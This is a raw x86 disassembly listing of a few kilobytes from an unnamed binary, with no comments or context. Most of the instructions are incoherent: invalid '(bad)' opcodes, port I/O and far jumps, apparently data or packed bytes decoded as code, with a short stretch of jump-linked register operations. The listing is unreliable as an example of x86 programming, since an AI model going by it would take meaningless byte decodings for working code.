  40a8ef:	sbb    DWORD PTR [edi-0x2f],esi
  40a8f2:	cwde   
  40a8f3:	mov    eax,ds:0xc01a3883
  40a8f8:	cmp    BYTE PTR [esi],ah
  40a8fa:	xor    ebp,DWORD PTR [edi+0x29]
  40a8fd:	lahf   
  40a8fe:	out    0x96,al
  40a900:	sub    esi,DWORD PTR [edi-0x21f98aa8]
  40a906:	xlat   BYTE PTR ds:[ebx]
  40a907:	sahf   
  40a908:	xor    esi,edi
  40a90a:	jnp    0x40a8ae
  40a90c:	pusha  
  40a90d:	cwde   
  40a90e:	(bad)  
  40a90f:	dec    ebp
  40a910:	mov    edx,0x2e504833
  40a915:	add    ecx,DWORD PTR [ecx]
  40a917:	push   edx
  40a918:	dec    edx
  40a919:	lds    esi,FWORD PTR [ebp-0x25]
  40a91c:	loopne 0x40a94a
  40a91e:	xor    eax,0xe08b7b96
  40a923:	not    DWORD PTR [ebp-0x5cb42d96]
  40a929:	in     eax,0x75
  40a92b:	inc    ecx
  40a92c:	or     DWORD PTR [ecx],edi
  40a92e:	xchg   ebp,eax
  40a92f:	repnz xor eax,0x7da9739e
  40a935:	mov    eax,ds:0xcf0aefbc
  40a93a:	sbb    DWORD PTR [ecx+edi*4+0x41],ebp
  40a93e:	xor    eax,0x4a2e5bfc
  40a943:	sub    eax,0xe65eef0d
  40a948:	add    eax,0x2099029c
  40a94d:	imul   edi,DWORD PTR [ebx+0x66],0x18c7b7c5
  40a954:	push   cs
  40a955:	ror    BYTE PTR [edx+0x36f03939],1
  40a95b:	and    al,0xa8
  40a95d:	inc    esp
  40a95e:	bound  ebp,QWORD PTR [edi]
  40a960:	add    BYTE PTR [ebp*2-0x50009d1],0x97
  40a968:	adc    esi,ebx
  40a96a:	fnsave [ecx]
  40a96c:	xlat   BYTE PTR ds:[ebx]
  40a96d:	int    0x6f
  40a96f:	cmp    eax,0xbcb1ab50
  40a974:	jns    0x40a914
  40a976:	nop
  40a977:	pop    ecx
  40a978:	pop    esp
  40a979:	jmp    0x40a9e5
  40a97b:	dec    ebp
  40a97c:	jg     0x40a932
  40a97e:	xlat   BYTE PTR ds:[ebx]
  40a97f:	adc    DWORD PTR [ebx],esp
  40a981:	or     al,0x81
  40a983:	test   DWORD PTR [eax],0x8ea3c1bb
  40a989:	add    ecx,DWORD PTR [ebx+0x68e2b059]
  40a98f:	das    
  40a990:	sahf   
  40a991:	shr    BYTE PTR [edx-0x24e4a296],1
  40a997:	push   esp
  40a998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a999:	add    al,0x96
  40a99b:	cmc    
  40a99c:	cdq    
  40a99d:	(bad)  
  40a99e:	mov    dl,0x0
  40a9a0:	xchg   DWORD PTR [esi-0x5a],edi
  40a9a3:	in     al,0xf8
  40a9a5:	add    bl,BYTE PTR [edi+0x3a01cf53]
  40a9ab:	dec    edi
  40a9ac:	stos   DWORD PTR es:[edi],eax
  40a9ad:	out    0xc,al
  40a9af:	adc    edx,DWORD PTR [ecx+eiz*2]
  40a9b2:	aaa    
  40a9b3:	(bad)  
  40a9b4:	sti    
  40a9b5:	pop    ds
  40a9b6:	aad    0x0
  40a9b8:	cmp    al,0xb
  40a9ba:	mov    DWORD PTR [esi+0x5],edi
  40a9bd:	int    0xb8
  40a9bf:	jecxz  0x40a9f7
  40a9c1:	lds    esi,FWORD PTR [ecx]
  40a9c3:	sub    ah,BYTE PTR [edi-0x49]
  40a9c6:	(bad)  
  40a9c8:	dec    esp
  40a9c9:	cmc    
  40a9ca:	dec    edx
  40a9cb:	or     esp,DWORD PTR [ebx]
  40a9cd:	add    al,0xde
  40a9cf:	mov    eax,0x24ee2e4a
  40a9d4:	in     eax,0x9d
  40a9d6:	mov    ah,0xbc
  40a9d8:	loope  0x40a978
  40a9da:	xchg   bl,cl
  40a9dc:	sub    BYTE PTR [eax-0x1f],dl
  40a9df:	fisttp WORD PTR [ebx-0x2dd110]
  40a9e5:	jns    0x40a9a7
  40a9e7:	and    eax,0x1cdec378
  40a9ec:	jmp    0x40aa06
  40a9ee:	imul   eax,DWORD PTR [edx+ebp*4-0x78],0xc
  40a9f3:	sahf   
  40a9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9f5:	add    ch,BYTE PTR [ebx]
  40a9f7:	push   ebx
  40a9f8:	jo     0x40a9c6
  40a9fa:	xlat   BYTE PTR ds:[ebx]
  40a9fb:	repnz or cl,bl
  40a9fe:	sub    eax,0x17b6d9ad
  40aa03:	data16 mov bl,0xf6
  40aa06:	mov    esp,0x76da28ab
  40aa0b:	fwait
  40aa0c:	and    esp,DWORD PTR [esi-0x47b6b437]
  40aa12:	imul   edi,ebp,0xbdb5774
  40aa18:	clc    
  40aa19:	dec    ebp
  40aa1a:	ja     0x40a9f7
  40aa1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa1d:	push   esi
  40aa1e:	pop    esp
  40aa1f:	outs   dx,BYTE PTR ds:[esi]
  40aa20:	sbb    cl,bl
  40aa22:	jle    0x40aa7b
  40aa24:	scas   eax,DWORD PTR es:[edi]
  40aa25:	push   0x4
  40aa27:	outs   dx,BYTE PTR ds:[esi]
  40aa28:	(bad)  
  40aa29:	xor    ch,ah
  40aa2b:	sbb    eax,esi
  40aa2d:	retf   0x37bd
  40aa30:	mov    edi,0x279086c4
  40aa35:	jp     0x40aa55
  40aa37:	push   ss
  40aa38:	ins    DWORD PTR es:[edi],dx
  40aa39:	dec    esi
  40aa3a:	or     BYTE PTR [eax+ebp*4],bh
  40aa3d:	dec    ebp
  40aa3e:	jl     0x40a9c0
  40aa40:	stos   DWORD PTR es:[edi],eax
  40aa41:	xchg   DWORD PTR [eax+0x3d1e8592],esp
  40aa47:	iret   
  40aa48:	in     al,dx
  40aa49:	mov    ch,0xd4
  40aa4b:	xchg   ebp,eax
  40aa4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa4d:	lahf   
  40aa4e:	adc    BYTE PTR [ebx+0x2e6ef2db],dh
  40aa54:	cmp    bl,dl
  40aa56:	rol    dl,0xd1
  40aa59:	out    0xac,eax
  40aa5b:	or     ch,dh
  40aa5d:	ss cmp eax,0x36b87ffc
  40aa63:	jmp    0x5224:0xfc2f2887
  40aa6a:	xor    DWORD PTR [ecx+eax*1+0xadae3b1],esi
  40aa71:	call   0xa44:0x56d78096
  40aa78:	lahf   
  40aa79:	mov    DWORD PTR [ebx-0x65450ada],edi
  40aa7f:	fbstp  TBYTE PTR [ecx+0x3f]
  40aa82:	inc    edx
  40aa83:	pop    edi
  40aa84:	aas    
  40aa85:	dec    esp
  40aa86:	sbb    ebp,DWORD PTR [bx+si-0x62]
  40aa8a:	push   cs
  40aa8b:	sti    
  40aa8c:	add    al,0xa2
  40aa8e:	fst    QWORD PTR [edi-0x3fae6b79]
  40aa94:	add    eax,0xa6b4adff
  40aa99:	mov    dl,0x67
  40aa9b:	fst    st(3)
  40aa9d:	sbb    al,0x61
  40aa9f:	xchg   edx,eax
  40aaa0:	or     eax,0xad01bbb3
  40aaa5:	or     cl,ah
  40aaa7:	and    eax,0xa58574a7
  40aaac:	adc    eax,0xd3b77b33
  40aab1:	mov    ah,BYTE PTR [eax]
  40aab3:	loopne 0x40aa87
  40aab5:	pusha  
  40aab6:	mov    edi,0x6343c956
  40aabb:	mov    eax,0x8884d41c
  40aac0:	cmp    al,BYTE PTR [edx]
  40aac2:	mov    bl,0xf3
  40aac4:	int3   
  40aac5:	(bad)  
  40aac6:	int    0x53
  40aac8:	in     al,dx
  40aac9:	aad    0x9e
  40aacb:	mov    ebx,0x686be8e1
  40aad0:	jmp    0x5a78f0ac
  40aad5:	add    dl,BYTE PTR [ecx+edx*2-0x3612a2b3]
  40aadc:	lods   eax,DWORD PTR ds:[esi]
  40aadd:	and    al,0xf3
  40aadf:	data16 mov dl,0xce
  40aae2:	out    dx,eax
  40aae3:	adc    eax,0x2cc6bda5
  40aae8:	add    BYTE PTR [ebx],bh
  40aaea:	cmp    al,0x61
  40aaec:	out    0x6f,eax
  40aaee:	lods   eax,DWORD PTR ds:[esi]
  40aaef:	sub    DWORD PTR [ebp-0x4b77cbb2],ebp
  40aaf5:	xchg   edx,eax
  40aaf6:	lods   al,BYTE PTR ds:[esi]
  40aaf7:	imul   eax,DWORD PTR [esi+0x35f675cf],0x5abb59d9
  40ab01:	aaa    
  40ab02:	xor    al,BYTE PTR [edx]
  40ab04:	inc    ecx
  40ab05:	push   es
  40ab06:	js     0x40aa8f
  40ab08:	sysexit 
  40ab0a:	inc    esp
  40ab0b:	out    0x3b,al
  40ab0d:	loop   0x40aaea
  40ab0f:	stos   BYTE PTR es:[edi],al
  40ab10:	xor    DWORD PTR [ecx-0x65425f45],ebx
  40ab16:	aas    
  40ab17:	push   0x52b83aa9
  40ab1c:	lea    esp,[bx]
  40ab1f:	jb     0x40ab96
  40ab21:	inc    ebx
  40ab22:	dec    ebx
  40ab23:	xchg   esp,eax
  40ab24:	jge    0x40aacc
  40ab26:	mov    bl,0x22
  40ab28:	arpl   WORD PTR [edx-0x3e],bp
  40ab2b:	in     eax,0x63
  40ab2d:	push   edi
  40ab2e:	sar    BYTE PTR [ebx+edi*1+0x33],0x2d
  40ab33:	test   eax,0xa52e1252
  40ab38:	adc    eax,DWORD PTR [eax-0x67e2e4e8]
  40ab3e:	push   ebx
  40ab3f:	jb     0x40abc0
  40ab41:	sub    eax,0x973eb315
  40ab46:	mov    al,0x91
  40ab48:	inc    edx
  40ab49:	sub    al,0x35
  40ab4b:	(bad)  
  40ab4d:	xchg   ebp,eax
  40ab4e:	lods   eax,DWORD PTR ds:[esi]
  40ab4f:	xchg   ebp,eax
  40ab50:	xchg   ebx,eax
  40ab51:	jge    0x40aafd
  40ab53:	pusha  
  40ab54:	aam    0x4
  40ab56:	aam    0xb
  40ab58:	xchg   edi,eax
  40ab59:	sbb    DWORD PTR [eax],ebp
  40ab5b:	inc    eax
  40ab5c:	mov    ebx,DWORD PTR [ecx]
  40ab5e:	push   esi
  40ab5f:	pop    eax
  40ab60:	push   edx
  40ab61:	mov    ?,WORD PTR [eax-0x3b920a87]
  40ab67:	stos   DWORD PTR es:[edi],eax
  40ab68:	rcr    BYTE PTR [edi],0xaa
  40ab6b:	mov    ch,0xf6
  40ab6d:	pushf  
  40ab6e:	cmp    eax,0x5224d5cb
  40ab73:	jle    0x40abde
  40ab75:	inc    ebp
  40ab76:	push   0xffffff92
  40ab78:	dec    esp
  40ab79:	push   eax
  40ab7a:	in     al,dx
  40ab7b:	test   DWORD PTR [edi],edi
  40ab7d:	scas   eax,DWORD PTR es:[edi]
  40ab7e:	xchg   esi,eax
  40ab7f:	jo     0x40ab46
  40ab81:	stc    
  40ab82:	pop    edi
  40ab83:	ret    0x4e04
  40ab86:	or     esi,esp
  40ab88:	push   0x54
  40ab8a:	ins    BYTE PTR es:[edi],dx
  40ab8b:	adc    ch,bh
  40ab8d:	ss mov ch,0xd7
  40ab90:	xor    al,0x8f
  40ab92:	pusha  
  40ab93:	dec    BYTE PTR [edx]
  40ab95:	aaa    
  40ab96:	xchg   dh,dh
  40ab98:	mov    ch,0x29
  40ab9a:	sub    DWORD PTR [ecx+ecx*1],edx
  40ab9d:	mov    al,0x97
  40ab9f:	gs mov ecx,0xa15a50c6
  40aba5:	hlt    
  40aba6:	stc    
  40aba7:	cld    
  40aba8:	sbb    al,0x2a
  40abaa:	pop    ss
  40abab:	adc    eax,0x3e95cc99
  40abb0:	adc    bh,BYTE PTR [ecx]
  40abb2:	test   BYTE PTR [edi],bl
  40abb4:	adc    eax,0x7c677db3
  40abb9:	gs ret 0xf5ca
  40abbd:	mov    esi,0x77d9a1e2
  40abc2:	inc    eax
  40abc3:	pop    eax
  40abc4:	mov    ds:0xea17cd9b,al
  40abc9:	aas    
  40abca:	cmc    
  40abcb:	ins    DWORD PTR es:[edi],dx
  40abcc:	jns    0x40abe6
  40abce:	fwait
  40abcf:	std    
  40abd0:	inc    esp
  40abd1:	jle    0x40ab92
  40abd3:	jmp    0x40ab9c
  40abd5:	in     al,dx
  40abd6:	pop    edi
  40abd7:	leave  
  40abd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abd9:	shr    BYTE PTR [ebx],cl
  40abdb:	jo     0x40ac12
  40abdd:	cwde   
  40abde:	mov    bl,0x5e
  40abe0:	lea    ecx,[edi+edx*4]
  40abe3:	cmp    DWORD PTR [ebp-0x4b67f9ab],0x7b1a10ad
  40abed:	es xchg edi,eax
  40abef:	cs pushf 
  40abf1:	add    ah,ch
  40abf3:	sbb    edx,DWORD PTR [eax-0x4]
  40abf6:	mov    bh,0x70
  40abf8:	adc    DWORD PTR [ecx],ebp
  40abfa:	jns    0x40abcb
  40abfc:	daa    
  40abfd:	ss pop ss
  40abff:	cmp    cl,dh
  40ac01:	les    ecx,FWORD PTR [eax-0x43a96046]
  40ac07:	out    dx,al
  40ac08:	ror    DWORD PTR [esi-0x71c62cc2],cl
  40ac0e:	call   0x779e:0x1d2ad5e8
  40ac15:	mov    edi,0x23d1f5b7
  40ac1a:	shl    DWORD PTR ds:0x57c4d0b5,cl
  40ac20:	cli    
  40ac21:	pop    ebx
  40ac22:	jl     0x40ac12
  40ac24:	jecxz  0x40ac6d
  40ac26:	pop    es
  40ac27:	push   esi
  40ac28:	mov    cl,0x46
  40ac2a:	es sub al,0x94
  40ac2d:	jo     0x40abc1
  40ac2f:	icebp  
  40ac30:	loopne 0x40ac08
  40ac32:	xor    eax,0x716d8f85
  40ac37:	aaa    
  40ac38:	(bad)  
  40ac39:	xlat   BYTE PTR ds:[ebx]
  40ac3a:	dec    ebx
  40ac3b:	outs   dx,BYTE PTR ds:[esi]
  40ac3c:	imul   esp,DWORD PTR [eax+0x44deaa21],0x14fb2e8a
  40ac46:	mov    bl,0x17
  40ac48:	cmp    bh,BYTE PTR [edi+0x6a]
  40ac4b:	test   al,0x9d
  40ac4d:	or     BYTE PTR [edi+0x6461309b],al
  40ac53:	inc    ebp
  40ac54:	jae    0x40acb4
  40ac56:	xchg   edi,eax
  40ac57:	adc    BYTE PTR [edx],ah
  40ac59:	xor    cl,BYTE PTR [edi+0x186f2fd9]
  40ac5f:	xor    DWORD PTR [edi-0x499c1132],edx
  40ac65:	cli    
  40ac66:	sub    edx,DWORD PTR [ecx+0x1d]
  40ac69:	aam    0xeb
  40ac6b:	outs   dx,DWORD PTR ds:[esi]
  40ac6c:	les    edx,FWORD PTR [eax-0x6e019cf3]
  40ac72:	mov    dh,0xa8
  40ac74:	add    DWORD PTR [bp+di-0x13],esp
  40ac78:	pop    esi
  40ac79:	out    0x73,eax
  40ac7b:	cwde   
  40ac7c:	cmp    bl,ch
  40ac7e:	adc    BYTE PTR [eax-0x1a],dl
  40ac81:	lahf   
  40ac82:	loop   0x40acfd
  40ac84:	mov    al,0xa1
  40ac86:	xchg   edx,eax
  40ac87:	cmp    dh,ch
  40ac89:	sbb    al,0xfb
  40ac8b:	push   ds
  40ac8c:	mov    cl,0x24
  40ac8e:	mov    al,0xe3
  40ac90:	(bad)  
  40ac91:	adc    al,0x30
  40ac93:	cdq    
  40ac94:	and    bl,BYTE PTR [ebp-0x3c773a8]
  40ac9a:	adc    edi,edi
  40ac9c:	push   esp
  40ac9d:	add    eax,0x817507b8
  40aca2:	sub    cl,BYTE PTR [esi+0x36]
  40aca5:	or     ebp,ecx
  40aca7:	pop    edi
  40aca8:	add    DWORD PTR [eax+0x67d0ef95],esi
  40acae:	pop    edi
  40acaf:	lods   eax,DWORD PTR ds:[esi]
  40acb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acb1:	mov    ch,0xa1
  40acb3:	mov    al,0x68
  40acb5:	(bad)  
  40acb7:	add    edi,eax
  40acb9:	push   cs
  40acba:	jle    0x40acc8
  40acbc:	jmp    0x40ad1c
  40acbe:	xlat   BYTE PTR ds:[ebx]
  40acbf:	lds    ebx,FWORD PTR [edi-0x41]
  40acc2:	rol    BYTE PTR [edx],cl
  40acc4:	push   ebp
  40acc5:	inc    ebp
  40acc6:	adc    al,0x2c
  40acc8:	pop    ecx
  40acc9:	popf   
  40acca:	lahf   
  40accb:	dec    ebx
  40accc:	cmp    al,0xdc
  40acce:	xchg   edx,esi
  40acd0:	jo     0x40ace4
  40acd2:	cld    
  40acd3:	adc    bh,BYTE PTR [ecx-0x12]
  40acd6:	add    esp,DWORD PTR [edi*4-0x44d046f1]
  40acdd:	ds mov bl,0xcd
  40ace0:	retf   0x312c
  40ace3:	push   es
  40ace4:	hlt    
  40ace5:	dec    edx
  40ace6:	call   DWORD PTR [ebx+0x4]
  40ace9:	adc    edi,DWORD PTR [edx+edx*4-0x6642e273]
  40acf0:	addr16 push eax
  40acf2:	jg     0x40aceb
  40acf4:	pop    ecx
  40acf5:	inc    esp
  40acf6:	aaa    
  40acf7:	mov    ebx,0x5f5ef76f
  40acfc:	mov    esp,0x9b0ba1b6
  40ad01:	sti    
  40ad02:	cmp    dl,BYTE PTR [ebx+0x42545df7]
  40ad08:	fwait
  40ad09:	jb     0x40ad7c
  40ad0b:	cmp    dl,cl
  40ad0d:	adc    bh,BYTE PTR [edi+0x13790b87]
  40ad13:	call   0x1ad43edc
  40ad18:	jmp    0x40ace3
  40ad1a:	xor    bh,BYTE PTR [ebp-0x4cabaf79]
  40ad20:	push   esi
  40ad21:	sbb    eax,0xfff2adcb
  40ad26:	hlt    
  40ad27:	clc    
  40ad28:	ds push ecx
  40ad2a:	les    ebp,FWORD PTR [edx-0x362ddfc3]
  40ad30:	shl    DWORD PTR [ecx+0x54],1
  40ad33:	push   ebx
  40ad34:	dec    esp
  40ad35:	addr16 mov ds:0xd3f0,eax
  40ad39:	in     eax,dx
  40ad3a:	cli    
  40ad3b:	adc    DWORD PTR [ebp+ebp*2+0x7e0a6545],ebp
  40ad42:	es jb  0x40ace7
  40ad45:	rol    DWORD PTR [edx-0x77ed2b96],cl
  40ad4b:	popf   
  40ad4c:	push   cs
  40ad4d:	adc    BYTE PTR [ebp-0xe36c95b],ah
  40ad53:	push   esi
  40ad54:	fstp   TBYTE PTR [edx-0x23cec3a8]
  40ad5a:	js     0x40ada2
  40ad5c:	sbb    al,BYTE PTR [ebp+0x2e6146c8]
  40ad62:	shr    BYTE PTR [esi+0x49],0xdf
  40ad66:	xchg   edi,eax
  40ad67:	xor    BYTE PTR [ebp-0xe],0x40
  40ad6b:	pop    ds
  40ad6c:	mov    ds:0x15d34005,al
  40ad71:	xchg   BYTE PTR [eax+0x5ca0a9bf],ch
  40ad77:	fild   QWORD PTR [edi-0x16516200]
  40ad7d:	push   0xffffffde
  40ad7f:	sub    ah,bh
  40ad81:	fcmovb st,st(3)
  40ad83:	sbb    esp,DWORD PTR [edi+0x17]
  40ad86:	ret    
  40ad87:	jmp    ebx
  40ad89:	pop    ebp
  40ad8a:	out    dx,al
  40ad8b:	cwde   
  40ad8c:	push   edi
  40ad8d:	dec    edx
  40ad8e:	xchg   ecx,eax
  40ad8f:	rol    ecx,cl
  40ad91:	loopne 0x40ad77
  40ad93:	fld    TBYTE PTR [ebp+eiz*4-0x1c]
  40ad97:	jecxz  0x40ad5c
  40ad99:	call   0x7fa6:0xa05eb657
  40ada0:	(bad)  
  40ada1:	push   ebx
  40ada2:	hlt    
  40ada3:	shr    cl,0xad
  40ada6:	(bad)  
  40ada7:	rcr    DWORD PTR [esi],cl
  40ada9:	add    ecx,DWORD PTR [ecx-0x42138731]
  40adaf:	xchg   edx,eax
  40adb0:	mov    ebp,0xf379b07b
  40adb5:	xor    esi,ebx
  40adb7:	gs aaa 
  40adb9:	mov    bh,0xa6
  40adbb:	or     DWORD PTR [edx-0x30766972],ebp
  40adc1:	mov    edx,eax
  40adc3:	in     eax,dx
  40adc4:	fadd   DWORD PTR [edi+eiz*8+0x46]
  40adc8:	stos   BYTE PTR es:[edi],al
  40adc9:	mov    ds:0x1706287,al
  40adce:	aaa    
  40adcf:	lahf   
  40add0:	xor    DWORD PTR [edi-0x4b],ebx
  40add3:	in     al,dx
  40add4:	shl    esp,0xf5
  40add7:	imul   edi,ebx,0xffffffef
  40adda:	or     al,0x21
  40addc:	call   0xe5137b9d
  40ade1:	xchg   DWORD PTR [edx+ecx*4-0x3736b231],esi
  40ade8:	sub    ecx,edi
  40adea:	lods   al,BYTE PTR es:[esi]
  40adec:	xlat   BYTE PTR ds:[ebx]
  40aded:	push   ecx
  40adee:	pop    es
  40adef:	xor    dl,0xba
  40adf2:	sbb    DWORD PTR [ebx+ebp*1-0xe],0x1d6a73f6
  40adfa:	aaa    
  40adfb:	out    0xd7,al
  40adfd:	std    
  40adfe:	scas   al,BYTE PTR es:[edi]
  40adff:	ror    DWORD PTR [eax-0x36],1
  40ae02:	js     0x40ad8e
  40ae04:	sbb    ecx,edi
  40ae06:	fwait
  40ae07:	jmp    0x15698665
  40ae0c:	cmp    eax,0xa58a28f4
  40ae11:	or     edi,DWORD PTR [ebp+0x2c]
  40ae14:	fdivr  st(7),st
  40ae16:	sti    
  40ae17:	xchg   ebp,eax
  40ae18:	retf   
  40ae19:	(bad)  
  40ae1a:	cld    
  40ae1b:	pushf  
  40ae1c:	aaa    
  40ae1d:	xor    eax,0x1c8cb44c
  40ae22:	arpl   cx,sp
  40ae24:	out    dx,eax
  40ae25:	jmp    0xd5a821f2
  40ae2a:	enter  0x1a25,0xf6
  40ae2e:	push   DWORD PTR [eax+0x694286dc]
  40ae34:	mov    ebx,esi
  40ae36:	loop   0x40adba
  40ae38:	nop
  40ae39:	mov    dh,0xc7
  40ae3b:	call   0xea77:0xeed07fd3
  40ae42:	mov    bl,0x19
  40ae44:	fwait
  40ae45:	add    DWORD PTR [edi+0xe],0x3f
  40ae49:	jmp    0xb4a360a3
  40ae4e:	popf   
  40ae4f:	cmc    
  40ae50:	sahf   
  40ae51:	mov    ds:0x8c81c056,al
  40ae56:	fdivrp st(3),st
  40ae58:	xor    al,0x68
  40ae5a:	dec    edx
  40ae5b:	pop    esp
  40ae5c:	cli    
  40ae5d:	ror    cl,0x59
  40ae60:	jl     0x40adeb
  40ae62:	dec    esp
  40ae63:	jno    0x40ae72
  40ae65:	mov    ds:0xb69a1615,al
  40ae6a:	(bad)  
  40ae6b:	pop    ebp
  40ae6c:	addr16 js 0x40adff
  40ae6f:	jae    0x40ae3d
  40ae71:	pop    ds
  40ae72:	adc    ah,bl
  40ae74:	fisub  DWORD PTR [esi+0x35]
  40ae77:	lods   eax,DWORD PTR ds:[esi]
  40ae78:	xchg   ebp,eax
  40ae79:	ret    
  40ae7a:	(bad)  
  40ae7b:	jae    0x40aeb4
  40ae7d:	aaa    
  40ae7e:	jle    0x40aed3
  40ae80:	mov    ds:0x790b1b44,al
  40ae85:	xchg   esi,eax
  40ae86:	sbb    edx,DWORD PTR [esi-0x3f83575b]
  40ae8c:	push   ebp
  40ae8d:	jmp    0xc92de138
  40ae92:	(bad)  
  40ae93:	ret    
  40ae94:	(bad)  
  40ae95:	out    dx,eax
  40ae96:	rcr    BYTE PTR [ebp+0x40d53680],1
  40ae9c:	dec    esi
  40ae9d:	lods   al,BYTE PTR ds:[esi]
  40ae9e:	mov    cl,0x22
  40aea0:	idiv   DWORD PTR ds:0x3de90569
  40aea6:	aad    0x43
  40aea8:	adc    eax,0xb70f8821
  40aead:	add    al,0x58
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x77aea730],al
  40aef6:	add    DWORD PTR [ebp-0x7e],esp
  40aef9:	or     DWORD PTR [ebx+0x7b],edi
  40aefc:	adc    ebx,DWORD PTR [ebx+edi*2+0x74f8657b]
  40af03:	mov    al,0x78
  40af05:	jle    0x40aeac
  40af07:	inc    esi
  40af08:	nop
  40af09:	mov    al,ds:0x1df7cdb2
  40af0e:	out    dx,eax
  40af0f:	(bad)
  40af12:	cld    
  40af13:	sub    bl,BYTE PTR [ebp-0x44]
  40af16:	lods   eax,DWORD PTR ds:[esi]
  40af17:	adc    al,0xa3
  40af19:	std    
  40af1a:	sub    BYTE PTR [edx+0x21777ffb],0x38
  40af21:	popf   
  40af22:	mov    dl,0xbf
  40af24:	jecxz  0x40af04
  40af26:	push   ebp
  40af27:	pop    es
  40af28:	pushf  
  40af29:	jb     0x40af8c
  40af2b:	stos   DWORD PTR es:[edi],eax
  40af2c:	sahf   
  40af2d:	push   cs
  40af2e:	jo     0x40af67
  40af30:	dec    eax
  40af32:	sub    al,0x4f
  40af34:	xchg   ebp,eax
  40af35:	or     al,0xd8
  40af37:	pop    edi
  40af38:	fld    TBYTE PTR ds:0x69aef87d
  40af3e:	add    edi,ecx
  40af40:	hlt    
  40af41:	jnp    0x40af5a
  40af43:	ret    0xc702
  40af46:	jle    0x40aec8
  40af48:	pop    eax
  40af49:	adc    edi,DWORD PTR [edx+ebp*2-0x71]
  40af4d:	les    ebx,FWORD PTR [edx+0x2d]
  40af50:	add    eax,0xf4b6b892
  40af55:	mov    eax,ds:0x938eeeb5
  40af5a:	das    
  40af5b:	stos   BYTE PTR es:[edi],al
  40af5c:	sbb    eax,0xf684cc72
  40af61:	push   0xfffffff2
  40af63:	dec    ecx
  40af64:	nop
  40af65:	push   0xe36f4d1f
  40af6a:	test   eax,0x5b92c2eb
  40af6f:	outs   dx,BYTE PTR ds:[esi]
  40af70:	push   DWORD PTR ss:[ecx]
  40af73:	sti    
  40af74:	out    dx,al
  40af75:	xchg   edx,eax
  40af76:	fucomip st,st(7)
  40af78:	pop    edi
  40af79:	leave  
  40af7a:	lods   eax,DWORD PTR ds:[esi]
  40af7b:	sub    ebx,DWORD PTR [ecx-0x231c2d50]
  40af81:	ja     0x40af9d
  40af83:	fld    st(6)
  40af85:	or     eax,0xc6ac298e
  40af8a:	int    0x9c
  40af8c:	(bad)  
  40af8d:	iret   
  40af8e:	adc    edi,edx
  40af90:	xchg   bh,bl
  40af92:	cmp    eax,0xdef62141
  40af97:	push   edi
  40af98:	ret    0x5a4f
  40af9b:	sar    DWORD PTR [eax+0xe],1
  40af9e:	or     ch,0xa6
  40afa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa2:	push   edi
  40afa3:	cli    
  40afa4:	dec    esi
  40afa5:	bound  ecx,QWORD PTR ds:0x492d0ede
  40afab:	js     0x40af81
  40afad:	fs fs lahf 
  40afb0:	fisub  DWORD PTR [ecx]
  40afb2:	bound  esi,QWORD PTR [ecx-0x1a9f15e2]
  40afb8:	jg     0x40afcc
  40afba:	in     eax,dx
  40afbb:	and    al,0xc0
  40afbd:	icebp  
  40afbe:	push   DWORD PTR [esi+0x58]
  40afc1:	cmp    ch,BYTE PTR [ecx]
  40afc3:	ss pop ss
  40afc5:	repz (bad) 
  40afc7:	pushf  
  40afc8:	sbb    dl,BYTE PTR [eax]
  40afca:	std    
  40afcb:	push   0x6b43c5cb
  40afd0:	inc    edi
  40afd1:	fist   WORD PTR ds:0xf6b3fbc1
  40afd7:	pop    ebx
  40afd8:	pusha  
  40afd9:	jl     0x40afd9
  40afdb:	inc    DWORD PTR [ecx+0x71]
  40afde:	shl    eax,1
  40afe0:	push   ss
  40afe1:	push   edi
  40afe2:	retf   
  40afe3:	dec    eax
  40afe4:	xchg   ebx,eax
  40afe5:	push   ecx
  40afe6:	mov    bh,0xcd
  40afe8:	into   
  40afe9:	(bad)  
  40afea:	fs hlt 
  40afec:	fisubr DWORD PTR [edx]
  40afee:	inc    ebx
  40afef:	mov    ecx,0xf17ed76b
  40aff4:	or     cl,BYTE PTR [ebp+0x45]
  40aff7:	sub    BYTE PTR [esi],0xed
  40affa:	cmp    bh,ah
  40affc:	in     al,dx
  40affd:	loope  0x40b027
  40afff:	jnp    0x40afe6
  40b001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b002:	shl    dh,cl
  40b004:	sbb    BYTE PTR [ecx+0x5f],al
  40b007:	xchg   ebp,eax
  40b008:	or     ecx,DWORD PTR [esi-0x5a7b6e4]
  40b00e:	mov    ebp,0xfd10d3d9
  40b013:	fsub   DWORD PTR [eax]
  40b015:	add    eax,0xacb26574
  40b01a:	popa   
  40b01b:	add    ch,bl
  40b01d:	mov    esi,0x961024a9
  40b022:	add    eax,DWORD PTR [ebx-0x6d49f389]
  40b028:	iret   
  40b029:	push   ss
  40b02a:	xchg   BYTE PTR [ecx+0x6354c7f8],al
  40b030:	or     BYTE PTR [eax+0xae7cd38],dh
  40b036:	mov    edx,0xebd48ace
  40b03b:	mul    BYTE PTR [esi-0x23]
  40b03e:	jo     0x40b02a
  40b040:	or     BYTE PTR [ecx+0x9d07229],al
  40b046:	pop    eax
  40b047:	pop    ebx
  40b048:	mov    esp,0x11018a7
